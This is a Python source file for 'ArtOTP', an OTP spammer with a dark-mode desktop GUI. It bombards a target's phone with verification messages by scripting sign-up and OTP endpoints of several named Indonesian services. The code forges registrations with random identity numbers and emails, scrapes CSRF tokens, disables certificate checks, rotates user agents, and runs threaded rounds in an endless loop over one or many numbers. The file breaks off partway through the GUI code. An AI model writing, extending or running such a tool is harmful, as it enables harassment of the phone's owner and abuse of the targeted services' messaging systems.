#!/usr/bin/env python3
# main.py - ArtOTP OTP Spammer (Consolidated & Refactored Edition)

import os
import sys
import re
import time
import math
import uuid
import json
import gzip
import ssl
import random
import string
import queue
import signal
import shutil
import threading
import urllib.parse
import urllib.request
import urllib.error
import http.cookiejar
from concurrent.futures import ThreadPoolExecutor, as_completed

# Optional GUI imports (Tkinter)
try:
    import tkinter as tk
    from tkinter import ttk, messagebox
    HAS_TK = True
except ImportError:
    HAS_TK = False

# Terminal / TTY utilities
try:
    import tty
    import termios
except ImportError:
    tty = None
    termios = None

# ANSI color codes (replaces colorama)
class Fore:
    GREEN  = '\033[32m'
    RED    = '\033[31m'
    YELLOW = '\033[33m'
    CYAN   = '\033[36m'
    WHITE  = '\033[37m'
    BLUE   = '\033[34m'
    MAGENTA= '\033[35m'

class Style:
    RESET_ALL = '\033[0m'
    BRIGHT    = '\033[1m'

# Enable ANSI on Windows
if sys.platform == 'win32':
    os.system('')

# =====================================================================
# LIGHTWEIGHT HTTP SESSION (replaces requests)
# =====================================================================

_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE

class _Response:
    def __init__(self, status_code, headers, body_bytes, url):
        self.status_code = status_code
        self.headers = headers
        self._body = body_bytes
        self.url = url
        self.text = ''
        try:
            encoding = 'utf-8'
            ct = headers.get('Content-Type', '')
            if 'charset=' in ct:
                encoding = ct.split('charset=')[-1].split(';')[0].strip()
            ce = headers.get('Content-Encoding', '')
            data = gzip.decompress(body_bytes) if 'gzip' in ce else body_bytes
            self.text = data.decode(encoding, errors='replace')
        except Exception:
            try:
                self.text = body_bytes.decode('utf-8', errors='replace')
            except Exception:
                self.text = ''

    def json(self):
        return json.loads(self.text)

class Session:
    def __init__(self):
        self.cookies = http.cookiejar.CookieJar()
        self._opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=_SSL_CTX),
            urllib.request.HTTPCookieProcessor(self.cookies),
            urllib.request.HTTPRedirectHandler(),
        )
        self._default_headers = {}

    def headers_update(self, d):
        self._default_headers.update(d)

    def _cookie_get(self, name):
        for c in self.cookies:
            if c.name == name:
                return urllib.parse.unquote(c.value)
        return None

    def _do(self, method, url, headers=None, data=None, timeout=10, allow_redirects=True):
        merged = {**self._default_headers, **(headers or {})}
        body = None
        if data is not None:
            if isinstance(data, str):
                body = data.encode('utf-8')
            elif isinstance(data, bytes):
                body = data
            else:
                body = urllib.parse.urlencode(data).encode('utf-8')
        req = urllib.request.Request(url, data=body, headers=merged, method=method)
        if not allow_redirects:
            class NoRedirect(urllib.request.HTTPErrorProcessor):
                def http_response(self, request, response):
                    return response
                https_response = http_response
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=_SSL_CTX),
                urllib.request.HTTPCookieProcessor(self.cookies),
                NoRedirect(),
            )
        else:
            opener = self._opener
        try:
            with opener.open(req, timeout=timeout) as resp:
                body_bytes = resp.read()
                return _Response(resp.status, dict(resp.headers), body_bytes, resp.url)
        except urllib.error.HTTPError as e:
            body_bytes = e.read() if e.fp else b''
            return _Response(e.code, dict(e.headers) if e.headers else {}, body_bytes, url)
        except Exception:
            raise

    def get(self, url, headers=None, timeout=10):
        return self._do('GET', url, headers=headers, timeout=timeout)

    def post(self, url, headers=None, data=None, json=None, timeout=10, allow_redirects=True):
        h = dict(headers or {})
        if json is not None:
            import json as _json
            data = _json.dumps(json)
            h.setdefault('Content-Type', 'application/json')
        return self._do('POST', url, headers=h, data=data, timeout=timeout, allow_redirects=allow_redirects)

def _simple_get(url, headers=None, timeout=10):
    s = Session()
    return s.get(url, headers=headers, timeout=timeout)

def _simple_post(url, headers=None, data=None, json_data=None, timeout=10):
    s = Session()
    return s.post(url, headers=headers, data=data, json=json_data, timeout=timeout)

VERSION = "1.0.0"
TOOLS_NAME = "ArtOTP"

# =====================================================================
# SECTION 1: USER-AGENTS & UTILITY FUNCTIONS
# =====================================================================

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def normalize(phone):
    """Normalisasi nomor telepon ke format 62 (contoh: 6281234567890)."""
    n = phone.strip().replace(' ', '').replace('-', '').replace('+', '')
    if not n.isdigit():
        return ''
    if n.startswith('08'):
        result = '62' + n[1:]
    elif n.startswith('8'):
        result = '62' + n
    elif n.startswith('62'):
        result = n
    else:
        return ''
    if len(result) < 11 or len(result) > 15:
        return ''
    return result

def fmt_08(p):
    return '0' + p[2:] if p.startswith('62') else p

def fmt_nocode(p):
    return p[2:] if p.startswith('62') else p

def fmt_plus(p):
    return '+' + p if not p.startswith('+') else p

def fmt_phone_only(p):
    if p.startswith('62'):
        return p[2:]
    if p.startswith('+62'):
        return p[3:]
    if p.startswith('0'):
        return p[1:]
    return p

_cached_ip = None

def get_public_ip():
    global _cached_ip
    if _cached_ip:
        return _cached_ip
    try:
        _cached_ip = _simple_get('https://api.ipify.org', timeout=3).text.strip()
    except Exception:
        _cached_ip = '127.0.0.1'
    return _cached_ip

def extract_csrf(html):
    patterns = [
        r'<meta name="csrf-token" content="([^"]+)"',
        r'<meta name="csrf_token" content="([^"]+)"',
        r'<input type="hidden" name="_token" value="([^"]+)"',
        r'<input type="hidden" name="csrf_token" value="([^"]+)"',
        r'<input type="hidden" name="_csrf" value="([^"]+)"',
        r'csrf_token\s*=\s*"([^"]+)"',
    ]
    for p in patterns:
        m = re.search(p, html, re.I)
        if m:
            return m.group(1)
    return None

def generate_multipart(data, boundary):
    body = ""
    for key, val in data.items():
        body += f"--{boundary}\r\n"
        body += f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
        body += f"{val}\r\n"
    body += f"--{boundary}--\r\n"
    return body

# =====================================================================
# SECTION 2: API HANDLERS (25+ SERVICE HANDLERS)
# =====================================================================

def send_hrsbre_otp(phone_08):
    BASE_URL = "https://career.hrs-bre.site"
    SIGN_UP_PAGE = f"{BASE_URL}/auth/sign_up"
    SIGN_UP_URL = f"{BASE_URL}/auth/sign_up_action"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Origin": BASE_URL,
        "Referer": SIGN_UP_PAGE,
    }
    session = Session()
    try:
        r = session.get(SIGN_UP_PAGE, headers=headers, timeout=10)
        if r.status_code != 200:
            return None, None
    except Exception:
        return None, None
    nik = ''.join(random.choices(string.digits, k=16))
    email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@mailnesia.com"
    username = ''.join(random.choices(string.ascii_letters, k=8))
    password = 'Aa1' + ''.join(random.choices(string.ascii_letters + string.digits, k=7))
    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    body = (
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"nik\"\r\n\r\n{nik}\r\n"
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{email}\r\n"
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"whatsapp\"\r\n\r\n{phone_08}\r\n"
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n{username}\r\n"
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{password}\r\n"
        f"--{boundary}--\r\n"
    )
    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
    try:
        resp = session.post(SIGN_UP_URL, headers=headers, data=body, timeout=10)
        return resp.status_code, resp.text
    except Exception:
        return None, None

def send_rcx_otp(identifier, name, email):
    sess = Session()
    sess.headers_update({"User-Agent": get_random_user_agent()})
    try:
        reg_get = sess.get("https://sso.rcx.co.id/register", timeout=10)
        if reg_get.status_code != 200: return None
    except Exception:
        return None
    token = sess._cookie_get("XSRF-TOKEN") or extract_csrf(reg_get.text)
    if not token: return None
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://sso.rcx.co.id", "Referer": "https://sso.rcx.co.id/register",
    }
    data = {"_token": urllib.parse.unquote(str(token)), "mode": "register", "channel": "whatsapp",
            "name": name, "email": email, "identifier": identifier}
    try:
        return sess.post("https://sso.rcx.co.id/auth/passwordless/request", headers=headers, data=data, allow_redirects=False, timeout=10)
    except Exception:
        return None

def send_beautyhaul_otp(local_number):
    url = "https://www.beautyhaul.com/ajax/account/send_otp"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.beautyhaul.com"}
    try:
        return _simple_post(url, headers=headers, json_data={"nomor_ponsel": local_number, "method": "WhatsApp"}, timeout=10)
    except Exception:
        return None

def send_internetrakyat_otp(phone_08):
    base_url = "https://internetrakyat.id"
    register_page = f"{base_url}/auth/register"
    api_url = f"{base_url}/api/app/auth/send-otp-register"
    headers = {
        "Host": "internetrakyat.id",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": '"Android"',
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "Content-Type": "application/json",
        "x-api-key": "280999!FTTH",
        "sec-ch-ua-mobile": "?1",
        "Origin": "https://internetrakyat.id",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": register_page,
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    session = Session()
    try:
        session.get(register_page, headers={"User-Agent": get_random_user_agent()}, timeout=10)
    except Exception:
        pass
    try:
        return session.post(api_url, headers=headers, json={"phone_number": phone_08}, timeout=10)
    except Exception:
        return None

def send_royal_canin_otp(phone_plus):
    sess = Session()
    sess.headers_update({
        "Host": "club.royalcanin.id",
        "sec-ch-ua-platform": '"Android"',
        "User-Agent": get_random_user_agent(),
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "accept": "*/*",
        "origin": "https://club.royalcanin.id",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    })
    try:
        resp = sess.get("https://club.royalcanin.id/sign-up", timeout=10)
        if resp.status_code != 200:
            return None
    except Exception:
        return None
    payload = {
        "params": {
            "Email": "",
            "mobile_number": phone_plus,
            "OTPType": "IM"
        }
    }
    try:
        return sess.post("https://club.royalcanin.id/api/get_otp", json=payload, timeout=20)
    except Exception:
        return None


# =====================================================================

# SECTION 3: TARGET API DEFINITIONS
# =====================================================================

TARGETS = [
    # ===== Specific Handlers =====
    {'name': 'HRS-BRE', 'post_type': 'hrsbre', 'number_fmt': fmt_08},
    {'name': 'RCX', 'post_type': 'rcx', 'number_fmt': fmt_08},
    {'name': 'Beautyhaul', 'post_type': 'beautyhaul', 'number_fmt': fmt_08},
    {'name': 'Internet Rakyat', 'post_type': 'internetrakyat', 'number_fmt': fmt_08},
    {'name': 'Royal Canin', 'post_type': 'royal_canin', 'number_fmt': fmt_plus},

    # ===== JSON Generic Targets =====
    {
        'name': 'Rumah123',
        'post_type': 'json',
        'url': 'https://www.rumah123.com/api/otp/request-otp',
        'referer': 'https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F',
        'headers': {'Content-Type': 'application/json;charset=UTF-8', 'Origin': 'https://www.rumah123.com'},
        'payload': '{"cancelledRequestId":"{rand}","ipAddress":"{ip}","phoneNumber":"{number}","portalId":1,"type":"WHATSAPP"}',
        'number_fmt': lambda p: p,
        'success_on': ['requestid']
    },
    {
        'name': 'Paper.id',
        'post_type': 'json',
        'url': 'https://register.paper.id/api/v1/auth/register/send-otp',
        'referer': 'https://paper.id/',
        'headers': {'Content-Type': 'application/json', 'Origin': 'https://paper.id'},
        'payload': '{"phone":"{number}","method":"whatsapp","registered_by":"flutter mweb"}',
        'number_fmt': lambda p: p,
        'success_on': ['otp', 'processed']
    },
    {
        'name': 'Bonus Belanja',
        'post_type': 'json',
        'url': 'https://www.bonusbelanja.com/api/auth/registration/app',
        'referer': 'https://www.bonusbelanja.com/register/',
        'headers': {'Content-Type': 'application/json', 'Origin': 'https://www.bonusbelanja.com'},
        'payload': '{"phone":"{number}","name":"User","agreeTnc":true,"agreeContact":true}',
        'number_fmt': lambda p: p,
        'success_on': ['error":false']
    },
    {
        'name': 'Pinhome',
        'post_type': 'json',
        'url': 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
        'referer': 'https://www.pinhome.id/daftar',
        'headers': {'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://www.pinhome.id'},
        'payload': '{"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber":"{number}"}',
        'number_fmt': fmt_nocode,
        'success_on': ['secretcode']
    }
]

# =====================================================================
# SECTION 4: EXECUTION ENGINE
# =====================================================================

print_lock = threading.Lock()
stop_flag = False
global_callback = None

def log_target(idx, total, name, status, detail=""):
    with print_lock:
        if global_callback:
            try:
                global_callback(name, status, detail)
            except Exception:
                pass

def process_target(api, target62, ip, idx, total):
    global stop_flag
    if stop_flag:
        return False

    name = api['name']
    post_type = api.get('post_type', '')
    status_text = "FAIL"
    detail = ""
    success = False

    try:
        session = Session()
        session.headers_update({'User-Agent': get_random_user_agent()})

        if post_type == 'hrsbre':
            number = api['number_fmt'](target62)
            code, _ = send_hrsbre_otp(number)
            if code in [200, 201]: status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'rcx':
            number = api['number_fmt'](target62)
            name_rand = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
            email = f'user{random.randint(1000,9999)}@mailnesia.com'
            resp = send_rcx_otp(number, name_rand, email)
            if resp and resp.status_code in [302, 303]: status_text, detail, success = "SUCCESS", "OTP triggered", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'beautyhaul':
            number = api['number_fmt'](target62)
            resp = send_beautyhaul_otp(number)
            if resp and resp.status_code in [200, 201, 422]: status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'internetrakyat':
            number = api['number_fmt'](target62)
            resp = send_internetrakyat_otp(number)
            if resp and resp.status_code in [200, 201]:
                try:
                    data = resp.json()
                    if data.get("statusCode") == 200:
                        status_text, detail, success = "SUCCESS", "OTP sent", True
                except Exception:
                    status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'royal_canin':
            number = api['number_fmt'](target62)
            resp = send_royal_canin_otp(number)
            if resp and resp.status_code == 200:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'json':
            number = api['number_fmt'](target62)
            url = api.get('url', '').replace('{rand}', str(uuid.uuid4()))
            referer = api.get('referer', '').replace('{raw}', target62)

            csrf_token = None
            if referer:
                try:
                    r_ref = session.get(referer, timeout=10)
                    csrf_token = (session._cookie_get('_X7kCsrf')
                                  or session._cookie_get('csrfToken')
                                  or session._cookie_get('XSRF-TOKEN'))
                    if not csrf_token and r_ref:
                        m = re.search(r'"csrfToken":"([^"]+)"', r_ref.text)
                        if m:
                            csrf_token = m.group(1)
                except Exception:
                    pass

            payload_str = api['payload'].replace('{number}', str(number))\
                .replace('{rand}', str(uuid.uuid4()))\
                .replace('{ip}', ip)\
                .replace('{raw}', target62)\
                .replace('{name}', 'User' + str(random.randint(100, 999)))\
                .replace('{email}', f'user{random.randint(1000,9999)}@mailnesia.com')\
                .replace('{pw}', 'Pass' + ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + '@1')

            headers = api.get('headers', {}).copy()
            headers['User-Agent'] = get_random_user_agent()
            if csrf_token:
                headers['x-csrf-token'] = csrf_token
                headers['x-xsrf-token'] = csrf_token

            resp = session.post(url, headers=headers, data=payload_str, timeout=10)

            if resp.status_code in [200, 201, 202]:
                text = resp.text.lower() if resp.text else ""
                if 'error":true' in text or '"status":"error"' in text:
                    keywords = api.get('success_on', [])
                    if any(kw in text for kw in keywords):
                        status_text, detail, success = "SUCCESS", "OTP sent", True
                    else:
                        status_text, detail = "FAIL", f"({resp.status_code})"
                else:
                    status_text, detail, success = "SUCCESS", "OTP sent", True
            elif resp.status_code in [400, 429]:
                text = resp.text.lower() if resp.text else ""
                if any(k in text for k in ['limit', 'wait', 'too many', 'terlalu banyak', 'sebentar', 'terkirim', 'processed']):
                    status_text, detail, success = "SUCCESS", "Rate limit (OTP active)", True
                else:
                    keywords = api.get('success_on', [])
                    if any(kw in text for kw in keywords):
                        status_text, detail, success = "SUCCESS", "OTP sent", True
                    else:
                        status_text, detail = "LIMITED", "Rate limit"
            elif resp.status_code == 403:
                status_text, detail = "BLOCKED", "Forbidden"
            else:
                text = resp.text.lower() if resp.text else ""
                keywords = api.get('success_on', [])
                if any(kw in text for kw in keywords):
                    status_text, detail, success = "SUCCESS", "OTP sent", True
                else:
                    status_text, detail = "FAIL", f"({resp.status_code})"

            log_target(idx, total, name, status_text, detail)
            return success

        else:
            log_target(idx, total, name, "SKIP", "Unknown post_type")
            return False

    except urllib.error.URLError:
        log_target(idx, total, name, "CONN_ERR", "")
    except Exception as e:
        log_target(idx, total, name, "ERROR", str(e)[:40])

    return success


def run_single_round(threads=15, target=None, callback=None):
    global stop_flag, global_callback
    stop_flag = False
    global_callback = callback
    total_targets = len(TARGETS)
    
    if target is None:
        target = input(f"{Fore.WHITE}Nomor target (08xx / +62xx): {Style.RESET_ALL}").strip()
    
    target62 = normalize(target)
    if not target62:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Format nomor tidak valid. Gunakan format 08xx atau +62xx")
        return False
    
    ip = get_public_ip()
    success_count = 0
    total_targets = len(TARGETS)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(process_target, api, target62, ip, idx, total_targets)
                   for idx, api in enumerate(TARGETS, 1)]
        for future in as_completed(futures):
            if stop_flag:
                break
            try:
                if future.result():
                    success_count += 1
            except Exception:
                pass

    with print_lock:
        ts = time.strftime("%H:%M:%S")
        print(f"{Fore.GREEN}[{ts}]{Style.RESET_ALL} OTP terkirim: {Fore.GREEN}{success_count}{Style.RESET_ALL}/{total_targets}")

    global_callback = None
    return success_count > 0

def run_infinite_loop(target=None, threads=15, delay=60, callback=None):
    global stop_flag, global_callback
    stop_flag = False
    global_callback = callback
    
    if target is None:
        target = input(f"{Fore.WHITE}Nomor target (08xx / +62xx): {Style.RESET_ALL}").strip()
    
    target62 = normalize(target)
    if not target62:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Format nomor tidak valid.")
        return False
    
    ip = get_public_ip()
    total_success = 0
    round_count = 0
    total_targets = len(TARGETS)

    try:
        while not stop_flag:
            round_count += 1
            round_ok = 0

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = [executor.submit(process_target, api, target62, ip, idx, total_targets)
                           for idx, api in enumerate(TARGETS, 1)]
                for future in as_completed(futures):
                    if stop_flag: break
                    try:
                        if future.result():
                            round_ok += 1
                            total_success += 1
                    except Exception: pass

            ts = time.strftime("%H:%M:%S")
            print(f"{Fore.GREEN}[{ts}]{Style.RESET_ALL} Round {round_count} — OTP terkirim: {Fore.GREEN}{round_ok}{Style.RESET_ALL}/{total_targets} | Total: {Fore.CYAN}{total_success}{Style.RESET_ALL}")

            if stop_flag: break
            for _ in range(delay):
                if stop_flag: break
                time.sleep(1)

    except KeyboardInterrupt:
        pass
    finally:
        global_callback = None

    return total_success > 0

# =====================================================================
# SECTION 5: DESKTOP GUI APPLICATION (TKINTER DARK MODE)
# =====================================================================

BG = "#0d1117"; CARD = "#161b22"; INP = "#21262d"; HOV = "#2d333b"
G  = "#39d353"; P    = "#a371f7"; B   = "#58a6ff"; R   = "#f85149"
Y  = "#e3b341"; T1   = "#e6edf3"; T2  = "#8b949e"; T3  = "#484f58"
BR = "#30363d"

class ArtOTPApp:
    def __init__(self, root):
        self.root = root
        self.root.title("ArtOTP — OTP Spammer")
        self.root.geometry("1150x730")
        self.root.configure(bg=BG)
        self.root.minsize(900, 600)

        self.running   = False
        self.stop_ev   = threading.Event()
        self.log_q     = queue.Queue()
        self.v_sent    = tk.IntVar(value=0)
        self.v_ok      = tk.IntVar(value=0)
        self.v_fail    = tk.IntVar(value=0)
        self.v_prog    = tk.DoubleVar(value=0)
        self.v_mode    = tk.StringVar(value="single")
        self.v_input   = tk.StringVar(value="single")
        self.v_threads = tk.IntVar(value=15)
        self.v_delay   = tk.IntVar(value=60)

        self._style()
        self._ui()
        self._poll()

    def _style(self):
        s = ttk.Style()
        s.theme_use("clam")
        s.configure("Green.Horizontal.TProgressbar", troughcolor=INP, background=G, thickness=10, bordercolor=INP)

    def _ui(self):
        self._header()
        main = tk.Frame(self.root, bg=BG)
        main.pack(fill="both", expand=True, padx=14, pady=(0, 8))
        main.columnconfigure(0, weight=4, minsize=370)
        main.columnconfigure(1, weight=6, minsize=460)
        main.rowconfigure(0, weight=1)
        self._left(main)
        self._right(main)
        self._footer()

    def _header(self):
        h = tk.Frame(self.root, bg=CARD, height=56)
        h.pack(fill="x")
        h.pack_propagate(False)
        tk.Frame(h, bg=G, width=4).pack(side="left", fill="y")
        tk.Label(h, text="ArtOTP", font=("Segoe UI", 18, "bold"), bg=CARD, fg=G).pack(side="left", padx=(12, 4))
        tk.Label(h, text="OTP Spammer", font=("Segoe UI", 10), bg=CARD, fg=T2).pack(side="left", pady=(8, 0))
        
        bframe = tk.Frame(h, bg=CARD)
        bframe.pack(side="left", padx=16)
        for txt, fg in [(f"{len(TARGETS)} APIs", B), (f"v{VERSION}", T2)]:
            b = tk.Frame(bframe, bg=INP, padx=8, pady=2)
            tk.Label(b, text=txt, bg=INP, fg=fg, font=("Segoe UI", 8, "bold")).pack()
            b.pack(side="left", padx=3)
            
        self.dot = tk.Label(h, text="●", font=("Segoe UI", 14), bg=CARD, fg=T3)
        self.dot.pack(side="right", padx=(0, 10))
        self.stat_lbl = tk.Label(h, text="Idle", font=("Segoe UI", 9), bg=CARD, fg=T2)
        self.stat_lbl.pack(side="right", padx=(0, 4))
        tk.Frame(self.root, bg=BR, height=1).pack(fill="x")

    def _left(self, parent):
        L = tk.Frame(parent, bg=BG)
        L.grid(row=0, column=0, sticky="nsew", padx=(0, 8), pady=8)

        tabs = tk.Frame(L, bg=CARD)
        tabs.pack(fill="x", pady=(0, 8))
        self.tab_s = self._tbtn(tabs, "📱 Single Nomor", lambda: self._sinput("single"))
        self.tab_m = self._tbtn(tabs, "📋 Multi Nomor", lambda: self._sinput("multi"))
        self.tab_s.pack(side="left", fill="x", expand=True)
        self.tab_m.pack(side="left", fill="x", expand=True)

        self.inp_container = tk.Frame(L, bg=BG)
        self.inp_container.pack(fill="both", expand=True)
        self._build_single()
        self._build_multi()
        self._sinput("single")

        mc = self._card(L, "⚡ Mode Eksekusi")
        mc.pack(fill="x", pady=(8, 0))
        mrow = tk.Frame(mc, bg=CARD)
        mrow.pack(fill="x", padx=12, pady=(4, 10))
        self.btn_sr = self._mbtn(mrow, "▶ Single Round", "single")
        self.btn_sr.pack(side="left", fill="x", expand=True, padx=(0, 4))
        self.btn_inf = self._mbtn(mrow, "⟳ Infinite Loop", "infinite")
        self.btn_inf.pack(side="left", fill="x", expand=True)

        oc = self._card(L, "⚙️ Opsi")
        oc.pack(fill="x", pady=(8, 0))
        of = tk.Frame(oc, bg=CARD)
        of.pack(fill="x", padx=12, pady=(4, 12))
        self._opt(of, "Thread", self.v_threads, 1, 50, "paralel").grid(row=0, column=0, sticky="ew", pady=2)
        self.delay_row = self._opt(of, "Delay (s)", self.v_delay, 5, 300, "infinite mode")
        self.delay_row.grid(row=1, column=0, sticky="ew", pady=2)
        self._smode("single")

    def _tbtn(self, p, txt, cmd):
        return tk.Button(p, text=txt, font=("Segoe UI", 9, "bold"), bg=CARD, fg=T2, bd=0, pady=10, relief="flat", activebackground=HOV, activeforeground=T1, cursor="hand2", command=cmd)

    def _mbtn(self, p, txt, mode):
        return tk.Button(p, text=txt, font=("Segoe UI", 9, "bold"), bg=INP, fg=T2, bd=0, padx=10, pady=8, relief="flat", activebackground=HOV, activeforeground=T1, cursor="hand2", command=lambda m=mode: self._smode(m))

    def _opt(self, p, lbl, var, fr, to, tip):
        row = tk.Frame(p, bg=CARD)
        tk.Label(row, text=lbl, bg=CARD, fg=T2, font=("Segoe UI", 9), width=12, anchor="w").pack(side="left")
        tk.Spinbox(row, from_=fr, to=to, textvariable=var, width=6, bg=INP, fg=T1, insertbackground=T1, bd=0, buttonbackground=INP, font=("Segoe UI", 9), highlightthickness=1, highlightbackground=BR, highlightcolor=G).pack(side="left", padx=(4, 0))
        tk.Label(row, text=tip, bg=CARD, fg=T3, font=("Segoe UI", 8)).pack(side="left", padx=8)
        return row

    def _build_single(self):
        self.sf = tk.Frame(self.inp_container, bg=BG)
        c = self._card(self.sf, "📱 Nomor Target")
        c.pack(fill="both", expand=True)
        inn = tk.Frame(c, bg=CARD)
        inn.pack(fill="both", expand=True, padx=12, pady=(4, 12))
        tk.Label(inn, text="Masukkan nomor HP target (Format: 08xx / 628xx / +628xx)", bg=CARD, fg=T2, font=("Segoe UI", 9)).pack(anchor="w", pady=(0, 6))
        self.s_entry = tk.Entry(inn, font=("Consolas", 14), bg=INP, fg=G, insertbackground=G, bd=0, relief="flat", highlightthickness=1, highlightbackground=BR, highlightcolor=G)
        self.s_entry.pack(fill="x", ipady=8)
        self.s_vlbl = tk.Label(inn, text="", bg=CARD, fg=T2, font=("Segoe UI", 8))
        self.s_vlbl.pack(anchor="w", pady=(4, 0))
        self.s_entry.bind("<KeyRelease>", self._vlive)

    def _build_multi(self):
        self.mf = tk.Frame(self.inp_container, bg=BG)
        c = self._card(self.mf, "📋 Daftar Nomor")
        c.pack(fill="both", expand=True)
        inn = tk.Frame(c, bg=CARD)
        inn.pack(fill="both", expand=True, padx=12, pady=(4, 12))
        hdr = tk.Frame(inn, bg=CARD)
        hdr.pack(fill="x", pady=(0, 6))
        tk.Label(hdr, text="Satu nomor per baris:", bg=CARD, fg=T2, font=("Segoe UI", 9)).pack(side="left")
        self.m_cnt = tk.Label(hdr, text="0 nomor", bg=CARD, fg=G, font=("Segoe UI", 9, "bold"))
        self.m_cnt.pack(side="right")
        tf = tk.Frame(inn, bg=CARD)
        tf.pack(fill="both", expand=True)
        self.m_text = tk.Text(tf, font=("Consolas", 11), bg=INP, fg=G, insertbackground=G, bd=0, relief="flat", highlightthickness=1, highlightbackground=BR, highlightcolor=G, wrap="none", selectbackground=P)
        sb = tk.Scrollbar(tf, command=self.m_text.yview, bg=CARD)
        sb.pack(side="right", fill="y")
        self.m_text.pack(side="left", fill="both", expand=True)
        self.m_text.config(yscrollcommand=sb.set)
        self.m_text.bind("<KeyRelease>", self._mcount)
        self.m_vlbl = tk.Label(inn, text="", bg=CARD, fg=T2, font=("Segoe UI", 8))
        self.m_vlbl.pack(anchor="w", pady=(4, 0))

    def _right(self, parent):
        R = tk.Frame(parent, bg=BG)
        R.grid(row=0, column=1, sticky="nsew", pady=8)
        R.rowconfigure(1, weight=1)
        R.columnconfigure(0, weight=1)
        self._stats(R)
        self._logbox(R)

    def _stats(self, parent):
        sc = tk.Frame(parent, bg=CARD)
        sc.grid(row=0, column=0, sticky="ew", pady=(0, 8))
        pf = tk.Frame(sc, bg=CARD, padx=14, pady=8)
        pf.pack(fill="x")
        top = tk.Frame(pf, bg=CARD)
        top.pack(fill="x", pady=(0, 4))
        self.p_lbl = tk.Label(top, text="Menunggu...", bg=CARD, fg=T2, font=("Segoe UI", 9))
        self.p_lbl.pack(side="left")
        self.p_pct = tk.Label(top, text="0%", bg=CARD, fg=G, font=("Segoe UI", 9, "bold"))
        self.p_pct.pack(side="right")
        self.pbar = ttk.Progressbar(pf, variable=self.v_prog, maximum=100, style="Green.Horizontal.TProgressbar")
        self.pbar.pack(fill="x")
        
        cf = tk.Frame(sc, bg=CARD, padx=12, pady=8)
        cf.pack(fill="x")
        for lbl, var, color in [("📤 TERKIRIM", self.v_sent, B), ("✅ SUKSES", self.v_ok, G), ("❌ GAGAL", self.v_fail, R)]:
            chip = tk.Frame(cf, bg=INP, pady=6)
            tk.Label(chip, text=lbl, bg=INP, fg=T2, font=("Segoe UI", 7, "bold")).pack()
